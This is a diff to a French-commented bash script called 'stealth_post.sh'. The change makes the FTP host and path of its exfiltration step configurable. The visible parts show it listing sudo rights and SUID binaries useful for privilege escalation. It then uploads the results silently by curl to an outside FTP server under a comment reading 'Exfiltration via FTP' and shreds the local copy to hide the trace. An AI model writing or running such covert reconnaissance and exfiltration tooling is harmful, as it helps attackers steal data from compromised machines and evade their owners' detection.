@@ -1,25 +1,36 @@
 #!/bin/bash
 set -euo pipefail
 
+# Usage :
+#   export FTP_USER="utilisateur"
+#   export FTP_PASS="motdepasse"
+#   export FTP_HOST="exemple.com"
+#   export FTP_PATH="uploads/sysinfo.txt"
+#   bash stealth_post.sh
+
 # Read FTP credentials from environment or optional config file
-FTP_USER="${FTP_USER:-}" 
+FTP_USER="${FTP_USER:-}"
 FTP_PASS="${FTP_PASS:-}"
+FTP_HOST="${FTP_HOST:-}"
+FTP_PATH="${FTP_PATH:-}"
 # Optional configuration file (~/.stealth_post.conf)
 CONFIG_FILE="${FTP_CONFIG_FILE:-$HOME/.stealth_post.conf}"
 
 # Source config file if variables are empty and file exists
-if [[ -z "$FTP_USER" || -z "$FTP_PASS" ]]; then
+if [[ -z "$FTP_USER" || -z "$FTP_PASS" || -z "$FTP_HOST" || -z "$FTP_PATH" ]]; then
     if [[ -f "$CONFIG_FILE" ]]; then
         # shellcheck disable=SC1090
         source "$CONFIG_FILE"
         FTP_USER="${FTP_USER:-}"
         FTP_PASS="${FTP_PASS:-}"
+        FTP_HOST="${FTP_HOST:-}"
+        FTP_PATH="${FTP_PATH:-}"
     fi
 fi
 
 # Error if credentials still unset
-if [[ -z "$FTP_USER" || -z "$FTP_PASS" ]]; then
-    echo "❌ Variables FTP_USER et FTP_PASS non définies" >&2
+if [[ -z "$FTP_USER" || -z "$FTP_PASS" || -z "$FTP_HOST" || -z "$FTP_PATH" ]]; then
+    echo "❌ Variables FTP_USER, FTP_PASS, FTP_HOST ou FTP_PATH non définies" >&2
     exit 1
 fi
 
@@ -51,7 +62,7 @@ sudo -l 2>/dev/null | grep -v "may not" >> "$OUT"
 find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null | grep -E 'bash|python|perl|find|nmap' >> "$OUT"
 
 # Exfiltration via FTP (modification demandée)
-curl -s -T "$OUT" "ftp://$FTP_USER:$FTP_PASS@ton-serveur.com/uploads/sysinfo.txt" --ftp-create-dirs >/dev/null
+curl -s -T "$OUT" "ftp://$FTP_USER:$FTP_PASS@$FTP_HOST/$FTP_PATH" --ftp-create-dirs >/dev/null
 
 # Nettoyage
 shred -u "$OUT"
